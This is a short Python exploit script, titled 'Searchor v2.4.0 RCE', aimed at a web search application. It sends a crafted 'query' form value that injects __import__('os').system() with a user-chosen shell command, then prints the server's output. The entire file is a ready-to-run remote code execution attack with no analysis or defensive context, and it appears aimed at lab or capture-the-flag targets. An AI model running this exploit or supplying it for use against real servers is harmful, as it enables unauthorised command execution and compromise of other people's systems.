#!/usr/bin/python

import argparse
import requests
import sys
from pwn import log

parser = argparse.ArgumentParser(description='Searchor v2.4.0 RCE')
parser.add_argument('-c', '--command', help='Command to execute', default='id')
parser.add_argument('-u', '--url', help='URL')
args = parser.parse_args()
if len(sys.argv) < 2:
    log.error('Missing arguments!')
else:
    r = requests.post(args.url, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'engine': 'AOL', 'query': f"',__import__(\"os\").system(\"{args.command}\"))#"})
    if r.status_code != 200:
        log.error('HTTP response code != 200')
    else:
        print(r.text.replace('https://search.aol.com/aol/search?q=',''))
            